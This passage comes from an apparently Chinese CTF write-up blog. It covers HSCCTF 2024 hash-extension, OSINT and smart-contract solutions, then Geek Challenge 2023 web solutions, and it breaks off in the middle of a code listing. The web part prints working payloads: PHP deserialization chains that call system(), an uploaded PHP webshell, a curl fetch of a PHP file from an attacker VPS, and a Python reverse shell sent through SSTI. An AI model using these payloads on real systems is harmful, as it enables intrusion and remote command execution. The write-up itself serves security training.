| INFO     | __main__:run:69 - 已知明文：b&#x27;adminweb.log&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:70 - 已知hash：b&#x27;9c80d2bb0bccfefeb3750744c0760496&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:72 - 新明文：b&#x27;adminweb.log\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x00\x00\x00\x00\x00\x00\x00/flag&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:73 - 新明文(url编码)：adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00%2Fflag</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:75 - 新hash:46879013726bfb7dff6921fd2e9ab2f8</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>GET /?md5=46879013726bfb7dff6921fd2e9ab2f8&amp;applicant=adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00&amp;filename=/flag</code></p><p>​    </p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="NICE-RIVER"><a href="#NICE-RIVER" class="headerlink" title="NICE_RIVER"></a>NICE_RIVER</h3><p>百度识图，识别大桥为琶洲大桥，根据方位定位到保利天幕广场员工停车场：<code>HSCCTF&#123;23.10393,113.38363&#125;</code>。</p><p>​    </p><h3 id="город"><a href="#город" class="headerlink" title="город"></a>город</h3><p>google识图，找到<a href="https://wikimapia.org/4495454/Olonkho-shopping-centre">https://wikimapia.org/4495454/Olonkho-shopping-centre</a></p><p>定位为Olonkho shopping centre，定位点：<code>HSCCTF&#123;62.03716,129.73620&#125;</code></p><p>​    </p><h3 id="CAR"><a href="#CAR" class="headerlink" title="CAR"></a>CAR</h3><p>截取楼的部分百度识图，识别出为渝州宾馆。</p><p>小红书里搜索渝州宾馆，看到一张清晰的图片，正对的是渝州宾馆黄山厅，左边是大堂。</p><p>结合百度和google卫星视图看，得到定位点：<code>HSCCTF&#123;29.53201,106.50045&#125;</code>。</p><p>​    </p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>搜索关键词：圣彼得堡+广场+船锚，找到相关图片：<a href="https://www.huitu.com/photo/show/20190424/162434930070.html。">https://www.huitu.com/photo/show/20190424/162434930070.html。</a></p><p>定位为圣彼得堡瓦西里岛古港口，定位点：<code>HSCCTF&#123;59.94387,30.30595&#125;</code>。</p><p>​    </p><h3 id="CITY"><a href="#CITY" class="headerlink" title="CITY"></a>CITY</h3><p>百度识图，找到米漾米居酒店，地址：<code>HSCCTF&#123;山东省菏泽市牡丹区黄巢路7号&#125;</code>。</p><p>​    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="BONUS"><a href="#BONUS" class="headerlink" title="BONUS"></a>BONUS</h3><blockquote><p><strong>年终奖</strong></p><p>坏消息：公司只给你发了一张超市的会员卡作为年终奖<br>好消息：余额有114514元<br>坏消息：只能用来购买一块钱的糖，一次只能买一个<br>好消息：余额只剩1元时可以获得名为flag的神秘大奖<br>兑奖地址：nc xx.xx.xx.xx xxxx</p><p>智能合约部署网络为Polygon Mumbai<br>地址为：0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//contract.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract VipCard &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function applyCard() public &#123;</span><br><span class="line">        balances[msg.sender] = 114514;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function topUp(uint _amount) public &#123;</span><br><span class="line">        balances[msg.sender] += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyCandy() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;not sufficient funds&quot;);</span><br><span class="line">        balances[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期，进入区块链浏览器PolygonScan查看地址0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a的<a href="https://mumbai.polygonscan.com/address/0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a">交易记录</a>，输入输入已完成题目要求的选手的地址即可。</p><p>预期解应该是uint上溢出漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。&lt;/p&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2024赛" scheme="https://lazzzaro.github.io/tags/2024%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Geek Challenge 2023</title>
    <link href="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/"/>
    <id>https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/</id>
    <published>2023-11-27T10:28:02.000Z</published>
    <updated>2024-03-31T10:02:56.254Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>第十四届极客大挑战 GEEK CHALLENGE 2023‼️<br>开放注册：10月25日晚10点<br>比赛时间：10月26日晚8点-11月26日晚8点<br>平台链接：<a href="https://game.sycsec.com/">https://game.sycsec.com/</a><br>赛题范围包括re，web，pwn，crypto，misc等等，本届赛题还加入全新yak语言元素，方向多样，趣味性高。<br>本届更增添校外排行榜，校外的同学们组队参与也能获得名次奖励，欢迎大家前来挑战 💪。</p><p><strong>Rank: 3</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><blockquote><p>http签到，点击就送flag <a href="http://1.117.175.65:23333/">http://1.117.175.65:23333/</a></p></blockquote><p><code>robots.txt</code> 获取账号密码，再按步骤用几个请求头字段绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.117.175.65:23333</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: sycsec.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">via: Syc.vip</span><br><span class="line">O2TAKUXX: GiveMeFlag</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=@dm1N123456r00t#</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h3><blockquote><p>来签个到吧先</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">web</span>:</span><br><span class="line">    public_eva1=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_interesting=<span class="string">&#x27;cat /f*&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_yxx=web()</span><br><span class="line">    public_QW=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">syc</span>:</span><br><span class="line">    public_cuit=lover()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(syc()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POST：</p><p><code>url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</code></p><p>​    </p><h3 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h3><p>文件上传绕过：MIME、图片头、绕关键字</p><p>构造请求头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a&lt;?=system($_GET[x]);</span><br></pre></td></tr></table></figure><p>上传成功后，访问 <code>uploadtest/378845_653a63ea1370a.php?x=cat /flag</code> 拿flag。</p><p>​    </p><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><blockquote><p>学了php了，那就来看看这些绕过吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>] !== <span class="string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>]) &lt; <span class="number">2023</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>] + <span class="number">1</span>) &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$array1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>];</span><br><span class="line">            <span class="variable">$array2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$array1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$array2</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="string">&quot;Happy to see you!&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;再绕最后一步吧&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好哩，快拿到flag啦&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;嘿嘿嘿，你别急啊&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>第1层：换行符绕过；</p><p>第2层：科学计数法绕 <code>intval()</code>；</p><p>第3层：sha1碰撞；</p><p>第4层：PHP解析特性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1</span><br><span class="line">Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.com</span><br><span class="line">Content-Length: 1320</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">qw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you!</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h3><blockquote><p>命令执行？真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// curl your domain</span></span><br><span class="line"><span class="comment">// flag is in /tmp/Syclover</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|f|:|\||\&amp;|!|&gt;|&lt;|`|\(|&#123;|\?|\n|\r/i&quot;</span>, <span class="variable">$address</span>))&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&gt; /dev/null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>利用VPS和curl写文件的参数：</p><p><code>?addr=-O%201.php%20x.x.x.x/1.txt</code></p><p>其中 <code>1.txt</code> 内容为：<code>&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt;</code></p><p>访问 <code>1.php</code> 得flag。</p><p>​    </p><h3 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h3><blockquote><p>De1ty的广东朋友跟女神表白被骂klf，现在气急败坏，你知道klf是什么意思嘛？他现在依旧觉得他不是klf你们才是，你能拿到flag证明他是klf嘛…</p></blockquote><p>路由：<code>/hack?klf=xxx</code></p><p>无过滤，但也无输出的SSTI盲打，利用python反弹shell到VPS：</p><p><code>/hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("x.x.x.x",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\' ').read())%&#125;</code></p><p>在根目录拿到flag。</p><p>​    </p><h3 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h3><blockquote><p>我想要回炉重造一波，怎么说，难道你不想吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;快来玩快来玩~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>反序列化，用 <code>S</code> 绕关键字过滤，去最后大括号绕 <code>Exception</code>。</p><p>发现读不出根目录flag值，存在open_basedir，利用绕过命令读：</p><p><code>/?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;;</code></p><p>​    </p><h3 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h3><blockquote><p>快来join我的博客吧！</p></blockquote><p>源码注释：<code>&lt;!--secret在根目录f14444文件里面，别忘记了--&gt;</code>。</p><p>首页得到泄露的文件 <code>app.cpython-39.pyc</code>，反编译得python源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 